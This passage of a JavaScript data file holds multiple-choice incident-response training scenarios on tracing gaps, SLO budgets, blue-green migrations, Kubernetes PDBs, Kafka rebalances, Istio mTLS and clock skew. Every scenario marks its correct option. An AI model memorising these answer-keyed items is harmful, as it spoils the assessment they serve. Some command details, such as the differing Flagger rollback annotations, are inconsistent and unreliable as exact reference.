                              { label: 'A', title: 'Scale Prometheus to a larger server with 256GB RAM', sub: 'Migrate to r5.8xlarge (256GB) + attach 2TB EBS volume', isCorrect: false },
                              { label: 'B', title: 'Remove the high-cardinality user_id label; add cardinality guards in relabeling config', sub: 'Remove user_id label from metric; add metric_relabel_configs: action: drop for high-cardinality labels', isCorrect: true },
                              { label: 'C', title: 'Switch from Prometheus to InfluxDB which handles high cardinality better', sub: 'Migrate to InfluxDB Cloud for better cardinality support', isCorrect: false },
                              { label: 'D', title: 'Increase Prometheus retention period to avoid frequent reloads', sub: 'prometheus: --storage.tsdb.retention.time=90d', isCorrect: false },
                            ]
  },

  {
    id: 'ENG-WAR-048',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'Distributed Tracing Shows Dark Latency (Missing Spans)',
            companies: ['Datadog', 'Jaeger'],
              timeEst: '~20 min',
                level: 'Mid',
                  status: 'Not Started',
                    realWorldContext: `A common distributed tracing puzzle: the trace shows Service A calls Service B, and the end-to-end latency is 800ms. But Service A's span shows 50ms execution and Service B's span shows 50ms execution. Where did the other 700ms go? This "dark latency" can indicate: network latency, connection pool waiting, DNS resolution time, or time between spans that isn't being instrumented.`,
                      desc: `Users report API latency of 800ms on the /checkout endpoint. Your distributed trace (Datadog APM) shows: Service A (30ms) → Service B (50ms) → Database query (10ms). Total instrumented spans: 90ms. Total actual latency: 800ms. 710ms is unaccounted for between spans. Network latency between services is typically 1-2ms. Where is the time going?`,
                        solution: `The "dark latency" is likely time spent waiting for a connection from the connection pool (not instrumented as a span). Add instrumentation to measure: (1) connection pool wait time (acquire_connection span), (2) HTTP client connection establishment time (including DNS + TCP + TLS), (3) serialization/deserialization time. Common culprits: connection pool contention, TLS handshake on every request (missing keep-alive), DNS resolution on each call.`,
                          explanation: `Distributed tracing gaps: spans only measure what's explicitly instrumented. Time spent waiting for a connection from a pool, TLS handshakes, and framework overhead are often not included in spans. Debugging: (1) Add connection pool instrumentation (most APM agents have this as an option). (2) Check if HTTP connections use keep-alive (Connection: keep-alive header). (3) Measure DNS TTL — per-request DNS lookups can add 200ms. (4) Check for synchronous blocking I/O that isn't traced. Tools: Datadog APM's "span gaps" view, Jaeger's critical path analysis.`,
                            options: [
                              { label: 'A', title: 'The database query is lying — add more detailed DB query traces', sub: 'Enable full query tracing: log all statements + explain plans', isCorrect: false },
                              { label: 'B', title: 'Add connection pool, TLS, and DNS instrumentation to find dark latency', sub: 'Add spans: pool_acquire, tls_handshake, dns_resolve; check keep-alive headers', isCorrect: true },
                              { label: 'C', title: 'The latency is normal — 800ms is acceptable for checkout', sub: 'Close the investigation; update SLO to 1000ms threshold', isCorrect: false },
                              { label: 'D', title: 'Add more Datadog agents to get more detailed traces', sub: 'Increase trace sampling rate from 10% to 100%', isCorrect: false },
                            ]
  },

  {
    id: 'ENG-WAR-049',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'SLO Budget Burned by a Single Chatty Client',
            companies: ['Google', 'Cloudflare'],
              timeEst: '~20 min',
                level: 'Mid',
                  status: 'Not Started',
                    realWorldContext: `Google's SRE book describes "error budget" management as a key SRE practice. An error budget for 99.9% SLO over 30 days is 43.8 minutes of allowed downtime. A single misbehaving client making 1M requests/minute with a 5% error rate can consume 3,000 errors/minute — burning through a month's error budget in hours. Without per-client attribution, you can't even see this happening.`,
                      desc: `Your API has a 99.9% SLO. Datadog shows your error rate spiked to 5% for the past 3 hours — you've burned 80% of your monthly error budget. The errors are all 429 Too Many Requests responses to a single API key (client_id: ABC-corp-integration). Their integration sends requests in a tight retry loop that ignores 429 responses. How do you protect your SLO going forward?`,
                        solution: `Immediately: block or severely throttle the misbehaving client_id at the API gateway level. Medium-term: implement per-client error budget tracking — when a specific client causes >10% of your total errors, auto-throttle them. Long-term: return Retry-After headers in 429 responses, implement jitter in your rate limiter (progressive throttling), and contact the client to fix their integration.`,
                          explanation: `SLO protection from noisy clients: (1) Per-client rate limiting (not just global) — each API key gets its own quota. (2) 429 response with Retry-After: clients that honor this will back off automatically. (3) Progressive throttling: first violation = 1min throttle, second = 10min, third = 1hr block. (4) Error budget attribution: track which clients contribute to which errors. If client X causes 80% of your 5xx errors, throttle X, not all clients. (5) Alert when a single client burns >20% of your monthly error budget.`,
                            options: [
                              { label: 'A', title: 'Scale up API server capacity to absorb the extra load from the misbehaving client', sub: 'kubectl scale deployment api --replicas=50', isCorrect: false },
                              { label: 'B', title: 'Block the misbehaving client at API gateway; implement per-client throttling + Retry-After', sub: 'Kong/NGINX: deny client_id=ABC-corp; add Retry-After header; per-client rate limit', isCorrect: true },
                              { label: 'C', title: 'Pause your SLO measurement until the client is fixed', sub: 'Disable SLO calculation for this incident window', isCorrect: false },
                              { label: 'D', title: 'Add a CAPTCHA to the API to stop automated clients', sub: 'Require reCAPTCHA v3 token on all API requests', isCorrect: false },
                            ]
  },

  {
    id: 'ENG-WAR-050',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'Observability Blind Spot: Silent Failure in Async Worker',
            companies: ['Shopify', 'DoorDash'],
              timeEst: '~20 min',
                level: 'Mid',
                  status: 'Not Started',
                    realWorldContext: `DoorDash's engineering team documented an incident where their async order assignment worker had a silent failure — it would dequeue tasks, encounter an error, catch the exception (to prevent crashes), and log a warning. No alert fired. Orders silently stopped being assigned to dashers for 2 hours. The worker appeared healthy (no crashes, low CPU), but thousands of orders were stuck in "processing" limbo.`,
                      desc: `Your order assignment worker processes tasks from SQS. For 2 hours, new orders appeared to be accepted (200 OK from the API) but were never assigned to delivery drivers. The SQS queue showed tasks being consumed (queue depth = 0), but drivers reported no new orders. The worker logs show: WARN: Assignment failed, skipping. Customers are calling. How was this hidden for 2 hours?`,
                        solution: `The worker catches exceptions silently and continues processing (the tasks disappear from the queue but nothing happens). Fix: (1) Never silently swallow errors in async workers — emit a metric (failed_assignments_total counter) and alert when it exceeds 0. (2) Send failed tasks to a Dead Letter Queue instead of discarding them. (3) Add a "heartbeat" metric emitted on every successful assignment — alert if this metric stops for >5 minutes. (4) Track business KPIs, not just system health — "orders assigned per minute" should alert if it drops to 0.`,
                          explanation: `Silent failures in async workers are particularly insidious because: (1) the queue appears healthy (tasks are consumed), (2) the worker appears healthy (no crashes, CPU normal), (3) only a business metric (orders assigned) reveals the problem. Defense layers: (a) Emit explicit success/failure metrics for every significant operation — don't let exceptions be silent. (b) Dead Letter Queue: failed tasks go to DLQ for retry and visibility. (c) Business metric monitoring: if "successful order assignments" drops below X/minute, alert. (d) Queue depth is NOT sufficient — tasks can be consumed and silently discarded.`,
                            options: [
                              { label: 'A', title: 'Add more SQS consumers to process the queue faster', sub: 'Scale worker deployment from 3 to 20 replicas', isCorrect: false },
                              { label: 'B', title: 'Emit failure metrics + send to DLQ + alert on business metric (orders/min)', sub: 'Counter: failed_assignments_total; SQS DLQ; Alert: assignments_per_minute < 10', isCorrect: true },
                              { label: 'C', title: 'Add verbose logging to the worker to capture all assignment events', sub: 'Set LOG_LEVEL=DEBUG on all worker instances', isCorrect: false },
                              { label: 'D', title: 'Restart the worker pods to clear any in-memory state causing failures', sub: 'kubectl rollout restart deployment/order-assignment-worker', isCorrect: false },
                            ]
  },

  // ─────────────────────────────────────────────────────────
  //  BATCH F: Cloud & Deployment (WAR-051 – WAR-060)
  // ─────────────────────────────────────────────────────────

  {
    id: 'ENG-WAR-051',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'Blue-Green Deployment: Database Migration Incompatibility',
            companies: ['Heroku', 'Render'],
              timeEst: '~30 min',
                level: 'Senior',
                  status: 'Not Started',
                    realWorldContext: `A classic zero-downtime deployment failure: blue-green deployment requires both versions (old and new) to run simultaneously during the switchover. If the new version runs a database migration that adds a NOT NULL column without a default, the old version (blue) immediately starts throwing errors because it can't INSERT rows without the new column. The deployment window becomes an outage.`,
                      desc: `Your blue-green deployment is running. Blue (old) and Green (new) are both live. The migration added a NOT NULL column "shipping_address" to the orders table with no default value. As soon as the migration ran, Blue started throwing: ERROR: null value in column "shipping_address" violates not-null constraint. 50% of traffic (still on Blue) is failing. Rolling back the migration while Green is live would break Green.`,
                        solution: `Backward-incompatible migrations break blue-green deployments. The fix requires a 3-step migration pattern: (1) Add column as nullable (no default, no constraint): ALTER TABLE orders ADD COLUMN shipping_address VARCHAR(500). (2) Deploy new code that writes to the column. (3) After old code is fully retired: ALTER TABLE orders ALTER COLUMN shipping_address SET NOT NULL. This way, both old (which doesn't write the column) and new (which does) can run simultaneously.`,
                          explanation: `Blue-green safe migration pattern (expand-contract): Phase 1 (Expand): Add column as nullable. Deploy new code. Both old and new code can write to the table — old ignores the column, new populates it. Phase 2 (Verify): Confirm all rows have the new column populated. Phase 3 (Contract): Apply NOT NULL constraint (only after old code is fully decommissioned). For removes: Phase 1 (stop writing to column), Phase 2 (remove column from reads), Phase 3 (drop column). This is the Stripe, GitHub, and Shopify approach to zero-downtime schema changes.`,
                            options: [
                              { label: 'A', title: 'Immediately roll back to the Blue deployment to stop errors', sub: 'Switch load balancer to 100% Blue; rollback migration', isCorrect: false },
                              { label: 'B', title: 'Add a default value to the NOT NULL column as an emergency patch', sub: 'ALTER TABLE orders ALTER COLUMN shipping_address SET DEFAULT \'\'', isCorrect: false },
                              { label: 'C', title: 'Switch 100% traffic to Green immediately to eliminate Blue errors', sub: 'Load balancer: Green 100%, Blue 0% immediately', isCorrect: false },
                              { label: 'D', title: 'In future: use 3-phase expand-contract migration; add nullable column first', sub: 'Phase 1: ADD COLUMN nullable → deploy → Phase 3: SET NOT NULL after cutover', isCorrect: true },
                            ]
  },

  {
    id: 'ENG-WAR-052',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'Canary Deployment Rolled Out to 100% By Mistake',
            companies: ['Netflix', 'Flagger'],
              timeEst: '~15 min',
                level: 'Junior',
                  status: 'Not Started',
                    realWorldContext: `Netflix's canary analysis system (Kayenta) is designed to automatically gate rollouts based on metrics comparison. A misconfigured Kayenta rule marked a canary with a 40% error rate as "passing" due to a threshold typo (40 instead of 4). The canary was auto-promoted to 100% production. Netflix's defense: they have layered checks including manual approval for changes to error rate thresholds.`,
                      desc: `Your CI/CD pipeline uses Flagger for automated canary analysis. A new version was deployed as a canary at 10% traffic. The canary analysis had a typo in the error threshold (40% instead of 4%). Flagger saw the canary's 30% error rate as within the 40% threshold and automatically promoted it to 100% of traffic. All production traffic is now on the broken version. Error rate is 30%.`,
                        solution: `Immediately trigger a rollback via Flagger: kubectl annotate canary <name> flagger.app/rollback-revision="true" or manually set the Deployment image back to the previous version. Then: fix the error threshold typo, add a validation step that requires human approval before promotion beyond 20%, and add schema validation to Flagger configuration files.`,
                          explanation: `Canary rollback in Flagger: either via annotation (kubectl annotate canary api flagger.app/rollback=true) or by manually patching the deployment to the previous image. Prevention: (1) Configuration validation: schema check Flagger CRDs with unit tests — assert errorRateThreshold < 10. (2) Progressive gates: 10% (automated) → 30% (manual approval) → 100% (manual approval). (3) Multiple metrics: don't rely solely on error rate; also gate on p99 latency and business KPIs. (4) Dry-run canary analysis in staging with synthetic traffic before production.`,
                            options: [
                              { label: 'A', title: 'Immediately deploy a hotfix to the new version to reduce its error rate', sub: 'Ship fix for the 30% error rate directly on top of the broken canary', isCorrect: false },
                              { label: 'B', title: 'Rollback via Flagger annotation; fix typo; add manual approval gate and config validation', sub: 'kubectl annotate canary api flagger.app/rollback=true; fix threshold; add gate', isCorrect: true },
                              { label: 'C', title: 'Delete the Flagger canary object to stop automated promotions', sub: 'kubectl delete canary api -n production', isCorrect: false },
                              { label: 'D', title: 'Wait for users to report errors, then decide if rollback is needed', sub: 'Monitor user feedback before taking action', isCorrect: false },
                            ]
  },

  {
    id: 'ENG-WAR-053',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'ECS Task Scheduling Failure (No Healthy Instances)',
            companies: ['AWS', 'Fargate'],
              timeEst: '~20 min',
                level: 'Mid',
                  status: 'Not Started',
                    realWorldContext: `A common AWS ECS incident: a deployment doubles the number of tasks during the rolling update, temporarily requiring 2x capacity. If the ECS cluster's EC2 instances are running at 90% CPU/memory, there's no room for the new tasks. ECS waits indefinitely for capacity ("AGENT DISCONNECTED: insufficient memory"), while the old tasks are being deregistered. The service ends up with 0 running tasks.`,
                      desc: `You triggered an ECS rolling deployment for your API service. The deployment has been "in progress" for 45 minutes. ECS events show: service api-service was unable to place a task because no container instance met all of its requirements. The old task definition's containers are stopping, but new tasks can't start — no EC2 instances have enough free memory (each task needs 2GB, instances are at 90% utilization). The service currently has 0 running tasks.`,
                        solution: `Immediately: manually register the old task definition revision and force a new deployment with the old version to restore running tasks. Then: configure ECS Capacity Provider with Cluster Auto Scaling so EC2 instances scale out when pending tasks exist. For future deployments: set the deployment minimum healthy percent to 100% (keep old tasks running) and maximum percent to 150% (only add 50% new tasks at a time, requiring available capacity).`,
                          explanation: `ECS rolling deployment drains old tasks and starts new ones. If at 100% capacity, new tasks can't start. Fix: minimum_healthy_percent=100 ensures old tasks stay running, maximum_percent=200 allows adding new ones — but this requires 2x capacity during deployment. Use ECS Capacity Providers with Target Tracking to auto-scale EC2 instances when pending tasks exist (PROVISIONING_NEW_CAPACITY state). Fargate sidesteps this entirely — no EC2 capacity management needed. Monitor: CapacityProviderReservation metric in CloudWatch.`,
                            options: [
                              { label: 'A', title: 'Manually terminate half the running EC2 instances to free memory for new tasks', sub: 'aws ec2 terminate-instances --instance-ids i-xxx i-yyy (to force task redistribution)', isCorrect: false },
                              { label: 'B', title: 'Force-deploy old task definition to restore service; configure Capacity Provider auto-scaling', sub: 'aws ecs update-service --task-definition api:prev-revision; configure ECS Capacity Provider', isCorrect: true },
                              { label: 'C', title: 'Delete the ECS service and recreate it with the new task definition', sub: 'aws ecs delete-service; aws ecs create-service with new task def', isCorrect: false },
                              { label: 'D', title: 'Increase EC2 instance type in the Auto Scaling Group', sub: 'aws autoscaling update-auto-scaling-group --instance-type r6g.2xlarge', isCorrect: false },
                            ]
  },

  {
    id: 'ENG-WAR-054',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'Kubernetes PodDisruptionBudget Blocks Node Drain',
            companies: ['Kubernetes', 'GKE'],
              timeEst: '~20 min',
                level: 'Mid',
                  status: 'Not Started',
                    realWorldContext: `A GKE maintenance window requires draining nodes for upgrade. The node drain hangs indefinitely because a PodDisruptionBudget (PDB) requires "at least 3 replicas always running", but the deployment only has 3 replicas — draining any node would violate the PDB. The node drain command waits forever for the PDB to be satisfied. The cluster upgrade is blocked and maintenance windows close.`,
                      desc: `You're running kubectl drain node-1 to prepare for a GKE upgrade. The drain has been running for 20 minutes and is stuck: Cannot evict pod as it would violate the pod's disruption budget. The affected deployment has 3 replicas spread across 3 nodes, and a PodDisruptionBudget requiring minAvailable: 3. Draining any single node evicts 1 pod, leaving only 2 — violating the PDB.`,
                        solution: `Two options: (1) Temporarily scale up the deployment to 4 replicas before draining — this allows 1 pod to be evicted while still meeting minAvailable: 3. (2) Temporarily patch the PDB to minAvailable: 2 during the maintenance window. Restore after drain completes. Long-term: ensure your PDB settings are achievable given your cluster topology — if minAvailable == replica count, no node can ever be drained.`,
                          explanation: `PodDisruptionBudget (PDB) protects service availability during voluntary disruptions (drains, upgrades). But if minAvailable equals the number of replicas, the PDB makes node draining impossible. Golden rule: minAvailable should always be < desired replica count. Example: 3 replicas → maxUnavailable: 1 (or minAvailable: 2) — allows 1 pod down at a time. For a drain to succeed: at least 1 pod must be evictable. Configure PDB based on your actual redundancy requirements, not "always all replicas."`,
                            options: [
                              { label: 'A', title: 'Use --force flag to override the PDB and force-drain the node', sub: 'kubectl drain node-1 --force --ignore-daemonsets', isCorrect: false },
                              { label: 'B', title: 'Scale deployment to 4 replicas before draining; restore PDB after upgrade', sub: 'kubectl scale deploy api --replicas=4; drain; scale back; fix PDB', isCorrect: true },
                              { label: 'C', title: 'Delete the PodDisruptionBudget permanently', sub: 'kubectl delete pdb api-pdb', isCorrect: false },
                              { label: 'D', title: 'Cancel the cluster upgrade and schedule it for a lower-traffic period', sub: 'Abort GKE upgrade; reschedule for weekend maintenance', isCorrect: false },
                            ]
  },

  {
    id: 'ENG-WAR-055',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'Auto-Scaling Race Condition (Scale-Down Kills Active Requests)',
            companies: ['AWS', 'GCP'],
              timeEst: '~20 min',
                level: 'Mid',
                  status: 'Not Started',
                    realWorldContext: `AWS Auto Scaling terminates instances without waiting for in-flight requests to complete. If an API request takes 30 seconds (e.g., a report generation job) and auto-scaling terminates the instance at second 15, the request fails. This causes elevated error rates during scale-down events. AWS supports lifecycle hooks to delay termination, and Kubernetes supports terminationGracePeriodSeconds for the same purpose.`,
                      desc: `During a traffic decrease after peak hours, your EC2 Auto Scaling Group starts scaling down. Users are reporting 5% of API requests are failing with connection reset errors. Analysis shows the failures occur when an EC2 instance is terminated mid-request. Your application handles requests up to 45 seconds long. The ASG terminates instances without waiting for requests to complete.`,
                        solution: `Implement connection draining (ALB connection draining / deregistration delay) before instance termination. In Auto Scaling: use Lifecycle Hooks (TerminatingWait state) to delay termination and allow the instance to: (1) signal the load balancer to stop routing new requests, (2) wait for existing requests to complete (up to 45 seconds), then (3) terminate. Set ALB deregistration_delay to 60 seconds to ensure the LB stops routing before the instance receives SIGTERM.`,
                          explanation: `Graceful shutdown sequence: (1) Auto Scaling marks instance for termination. (2) Lifecycle hook triggers (TerminatingWait). (3) Instance signals load balancer to deregister (stops receiving new traffic). (4) Load balancer connection drain period (60s): existing connections complete, new requests go elsewhere. (5) Instance sends SIGTERM to application process. (6) Application finishes in-flight requests (up to 45s). (7) SIGTERM → application graceful shutdown. (8) Auto Scaling continues termination. K8s equivalent: terminationGracePeriodSeconds + preStop hook.`,
                            options: [
                              { label: 'A', title: 'Disable auto-scaling and manually manage instance counts', sub: 'aws autoscaling suspend-processes --auto-scaling-group-name prod-asg', isCorrect: false },
                              { label: 'B', title: 'Add Lifecycle Hook (TerminatingWait) + ALB deregistration delay for graceful drain', sub: 'lifecycle hook: TerminatingWait 120s; ALB: deregistration_delay=60s; app: SIGTERM handler', isCorrect: true },
                              { label: 'C', title: 'Increase minimum instance count so scale-down never occurs during business hours', sub: 'ASG min_size: 20 (never scale below business-hour baseline)', isCorrect: false },
                              { label: 'D', title: 'Reduce maximum request timeout to 5 seconds to minimize impact of termination', sub: 'nginx: proxy_read_timeout 5s; app: request_timeout: 5000ms', isCorrect: false },
                            ]
  },

  // ─────────────────────────────────────────────────────────
  //  BATCH G: Advanced Distributed Systems (WAR-056 – WAR-060)
  // ─────────────────────────────────────────────────────────

  {
    id: 'ENG-WAR-056',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'Dual-Write Inconsistency During Database Migration',
            companies: ['Facebook', 'Airbnb'],
              timeEst: '~35 min',
                level: 'Senior',
                  status: 'Not Started',
                    realWorldContext: `Facebook's engineering team documented the complexity of migrating from one data store to another while maintaining consistency. During a "dual-write" migration phase, writes go to both old and new databases simultaneously. A partial failure (write succeeds to old DB, fails to new DB) leaves the two systems inconsistent — data that exists in the old store doesn't exist in the new one. This is one of the hardest problems in distributed systems.`,
                      desc: `You're migrating from MySQL to Cassandra. During the dual-write phase, writes are sent to both MySQL and Cassandra. A Cassandra network partition caused 2 hours of write failures — all writes during this period went only to MySQL. The migration team didn't detect this. Now, Cassandra is missing 2 hours of data. If you cut over to Cassandra, users will see missing records. You cannot afford extended downtime for a full re-sync.`,
                        solution: `Implement a reconciliation process: (1) Query MySQL for all records written during the failure window (WHERE created_at BETWEEN T1 AND T2). (2) For each record, attempt an upsert into Cassandra. (3) Use a CDC (Change Data Capture) tool like Debezium to tail MySQL binlog and replay missed events into Cassandra. Do not cut over until reconciliation is complete and a consistency check (random sample comparison) passes.`,
                          explanation: `Dual-write failure patterns: (1) Partial success: write to system A succeeds, write to B fails → inconsistency. (2) Detection: compare record counts and checksums between systems periodically. (3) Recovery: binlog-based replay (Debezium reads MySQL binlog and replays to Cassandra), or a full re-sync from a MySQL snapshot. Prevention: write to a message queue (Kafka) first (system of record), then consume from Kafka to write to both MySQL and Cassandra — Kafka provides replay capability on failure. This is the "event sourcing" migration pattern.`,
                            options: [
                              { label: 'A', title: 'Proceed with cutover to Cassandra and let users re-create missing data', sub: 'Accept data loss; communicate to users; proceed with migration', isCorrect: false },
                              { label: 'B', title: 'Reconcile via MySQL binlog replay (Debezium CDC) for the failure window; consistency check before cutover', sub: 'Debezium: replay MySQL binlog T1→T2 into Cassandra; run consistency check', isCorrect: true },
                              { label: 'C', title: 'Roll back entirely to MySQL and abandon the Cassandra migration', sub: 'Revert dual-write; cancel migration; stay on MySQL indefinitely', isCorrect: false },
                              { label: 'D', title: 'Do a full Cassandra TRUNCATE and re-sync all data from MySQL from scratch', sub: '4-hour downtime: dump MySQL → import to Cassandra', isCorrect: false },
                            ]
  },

  {
    id: 'ENG-WAR-057',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'Kafka Consumer Lag After Rebalance Storm',
            companies: ['LinkedIn', 'Confluent'],
              timeEst: '~30 min',
                level: 'Senior',
                  status: 'Not Started',
                    realWorldContext: `LinkedIn (creators of Kafka) documented "rebalance storms" — when a consumer group rebalances too frequently, no consumer makes progress. Each rebalance requires all consumers to stop processing, renegotiate partition ownership, and start processing from their last committed offset. If rebalances take 30 seconds each and trigger every 45 seconds (due to a slow consumer causing heartbeat timeouts), consumers spend more time rebalancing than consuming.`,
                      desc: `Your Kafka consumer group has a lag of 5 million messages and is growing, not shrinking. Consumer metrics show group is in continuous rebalancing state — every 30-60 seconds a rebalance triggers. A slow consumer (one pod with high CPU spike from an expensive message) occasionally exceeds the max.poll.interval.ms timeout, causing Kafka to think it's dead and trigger a rebalance, which drags all other healthy consumers into the renegotiation.`,
                        solution: `Fix the slow consumer: (1) Increase max.poll.interval.ms to give slow processing more time. (2) Reduce max.poll.records to consume fewer messages per poll interval (smaller batches). (3) Move heavy processing to an async thread pool so poll() returns before the timeout. Long term: use Static Group Membership (group.instance.id) — each consumer gets a sticky partition assignment that survives short disconnections without triggering a full rebalance.`,
                          explanation: `Kafka rebalance triggers: (1) consumer joins/leaves, (2) heartbeat timeout (session.timeout.ms), (3) max.poll.interval.ms exceeded (consumer polled but didn't call poll() again within the interval — means processing took too long). Fix: reduce work per poll batch (max.poll.records=50 instead of default 500), or move processing async so poll() is called on schedule. Static membership (group.instance.id): consumers get deterministic IDs and keep their partition assignments across pod restarts for up to group.instance.id timeout — dramatically reduces rebalances during rolling deployments.`,
                            options: [
                              { label: 'A', title: 'Scale the consumer group to 100 consumers to clear the backlog faster', sub: 'kubectl scale deployment kafka-consumer --replicas=100', isCorrect: false },
                              { label: 'B', title: 'Increase max.poll.interval.ms + reduce max.poll.records + enable static group membership', sub: 'max.poll.interval.ms=600000; max.poll.records=50; group.instance.id=pod-name', isCorrect: true },
                              { label: 'C', title: 'Delete and recreate the consumer group with a fresh offset', sub: 'kafka-consumer-groups.sh --delete --group my-group; recreate from latest', isCorrect: false },
                              { label: 'D', title: 'Increase Kafka partition count to distribute load more evenly', sub: 'kafka-topics.sh --alter --topic orders --partitions 100', isCorrect: false },
                            ]
  },

  {
    id: 'ENG-WAR-058',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'Istio mTLS Breaks Service After Policy Change',
            companies: ['Google', 'Lyft'],
              timeEst: '~25 min',
                level: 'Senior',
                  status: 'Not Started',
                    realWorldContext: `Lyft (one of Istio's creators at the time) documented incidents where changing mTLS policy from PERMISSIVE to STRICT caused services to stop communicating. In PERMISSIVE mode, both plain HTTP and mTLS are accepted. In STRICT mode, only mTLS connections are allowed. A legacy service without Envoy sidecar injected cannot initiate mTLS, so all its outbound calls to STRICT services fail with "connection refused" or TLS handshake errors.`,
                      desc: `Your security team changed the Istio PeerAuthentication policy from PERMISSIVE to STRICT across all namespaces to enforce mTLS. Within minutes, your legacy batch job service (which doesn't have Envoy sidecar injection enabled — it has sidecar.istio.io/inject: "false") started failing all outbound HTTP calls to other microservices with: TLS handshake error from remote address. The batch job is stuck.`,
                        solution: `The legacy service cannot initiate mTLS connections (no Envoy sidecar to handle the TLS). Short-term: apply a namespace-level DestinationRule with tls.mode: DISABLE for the specific host the legacy service calls, allowing plain text connections from that service. Medium-term: enable sidecar injection on the legacy service (or migrate to a mesh-compatible client). Do not revert the global STRICT policy — it protects all other services.`,
                          explanation: `Istio mTLS modes: PERMISSIVE: accepts both mTLS and plain HTTP (good for migration). STRICT: requires mTLS for all inbound connections (enforces zero-trust). A service without Envoy sidecar cannot participate in mTLS. The fix is NOT to revert to PERMISSIVE globally — this weakens security for all services. Instead: create a DestinationRule for the specific service-to-service communication path that needs an exception: DestinationRule: trafficPolicy: tls: mode: DISABLE. This allows the legacy service to communicate while all other services remain protected by STRICT mTLS.`,
                            options: [
                              { label: 'A', title: 'Revert PeerAuthentication to PERMISSIVE globally to restore all connectivity', sub: 'kubectl apply PeerAuthentication: mtls: mode: PERMISSIVE across all namespaces', isCorrect: false },
                              { label: 'B', title: 'Apply DestinationRule with tls: DISABLE for the legacy service path; plan sidecar migration', sub: 'DestinationRule: trafficPolicy.tls.mode: DISABLE for legacy→service path', isCorrect: true },
                              { label: 'C', title: 'Delete the legacy batch job pod and redeploy with sidecar injection enabled', sub: 'kubectl delete pod batch-job-xxx; label namespace for auto-injection', isCorrect: false },
                              { label: 'D', title: 'Expose the target service externally via LoadBalancer and have the legacy service call it via external IP', sub: 'Service type: LoadBalancer; legacy calls external URL instead of cluster-internal', isCorrect: false },
                            ]
  },

  {
    id: 'ENG-WAR-059',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'GitHub Actions Self-Hosted Runner Exhaustion',
            companies: ['GitHub', 'GitLab'],
              timeEst: '~20 min',
                level: 'Mid',
                  status: 'Not Started',
                    realWorldContext: `An engineering team's CI/CD pipeline stopped deploying for 3 hours. Investigation revealed all 10 self-hosted GitHub Actions runners were occupied running a runaway test suite — a flaky test with no timeout was running for 4 hours per job. All 10 runners were occupied by stuck jobs. New deployment PRs queued but couldn't start. The fix: add job-level timeouts and runner autoscaling.`,
                      desc: `Your GitHub Actions self-hosted runner pool (10 runners) is fully occupied. No new CI/CD jobs can start. Looking at the active jobs: 8 of 10 runners are running an integration test workflow that has been running for 4 hours (normally takes 15 minutes). The integration tests have no timeout configured. A flaky external API dependency is hanging, and the tests are waiting indefinitely. Critical deployment PRs are queued but unexecuted.`,
                        solution: `Immediately cancel the stuck workflow runs via the GitHub API or UI. Add a job-level timeout to all workflow files: timeout-minutes: 30. Also add step-level timeouts for individual test steps. Long-term: implement runner autoscaling (actions-runner-controller for Kubernetes) so the runner pool scales out during queue buildup. Add a monitoring alert when runner queue depth exceeds 5 jobs for > 5 minutes.`,
                          explanation: `GitHub Actions timeout configuration: jobs.job_id.timeout-minutes: 30 — cancels the job if it runs longer than 30 minutes. steps.timeout-minutes: 10 for individual steps. Without this, a job waits indefinitely for a hung network call. Runner autoscaling: actions-runner-controller (ARC) watches the Actions API for queued jobs and spins up Kubernetes pods as runners. When queue is empty, it scales to zero. This prevents runner starvation from a single runaway test suite.`,
                            options: [
                              { label: 'A', title: 'Add 10 more permanent self-hosted runners to the pool', sub: 'Provision 10 more EC2 instances as GitHub Actions runners', isCorrect: false },
                              { label: 'B', title: 'Cancel stuck jobs, add job timeout-minutes, implement runner autoscaling', sub: 'Cancel jobs → add timeout-minutes: 30 → deploy actions-runner-controller', isCorrect: true },
                              { label: 'C', title: 'Migrate from self-hosted runners to GitHub-hosted runners', sub: 'Change runs-on: self-hosted to runs-on: ubuntu-latest', isCorrect: false },
                              { label: 'D', title: 'Disable the integration test workflow until the flaky dependency is fixed', sub: 'Comment out the integration test job from workflow YAML', isCorrect: false },
                            ]
  },

  {
    id: 'ENG-WAR-060',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'Clock Skew Breaks Distributed Consensus (Raft / etcd)',
            companies: ['CockroachDB', 'TiKV'],
              timeEst: '~30 min',
                level: 'Senior',
                  status: 'Not Started',
                    realWorldContext: `CockroachDB uses hybrid logical clocks (HLC) to handle clock skew between nodes. When NTP synchronization fails and one node's clock drifts more than 500ms from others, CockroachDB rejects writes from that node to prevent causality violations. In a 3-node cluster, one node with a clock drift of 600ms effectively becomes unavailable — and if this node holds the Raft leader lease, the entire cluster stops accepting writes.`,
                      desc: `Your CockroachDB cluster (3 nodes) suddenly stops accepting write queries. Error logs show: ERROR: node 2: clock skew of 623ms exceeds maximum tolerated skew of 500ms. NTP was recently reconfigured on node 2 and its clock jumped forward by 623ms. Because of the clock skew safety check, node 2 is rejecting its own writes. The Raft leader happens to be on node 2. All other nodes are healthy with <5ms skew.`,
                        solution: `Fix NTP on node 2 immediately: sync the clock using ntpdate or chronyc. Do NOT force-adjust the clock backward by more than a few milliseconds at a time — a sudden large backward jump can violate causality (timestamps going backward). Use chrony's slew mode to gradually correct the clock. After clock is within acceptable skew: node 2 will automatically rejoin the cluster and Raft leader election will stabilize.`,
                          explanation: `Distributed databases rely on time for: (1) Raft leader leases (node with expired lease can't commit writes), (2) MVCC timestamp ordering (ensuring reads see causally consistent snapshots), (3) distributed transaction timestamps. Clock skew causes: (1) A node ahead of time can't commit (other nodes will see it as from the future). (2) A node behind time might overwrite newer data. Prevention: use PTP (Precision Time Protocol) instead of NTP for microsecond accuracy; use TrueTime (Google's GPS+atomic clock based time) if available; set chrony max_slew_rate to avoid sudden jumps.`,
                            options: [
                              { label: 'A', title: 'Force a manual clock adjustment on node 2 to immediately fix the drift', sub: 'timedatectl set-time "2024-01-15 14:30:00" (hard set clock)', isCorrect: false },
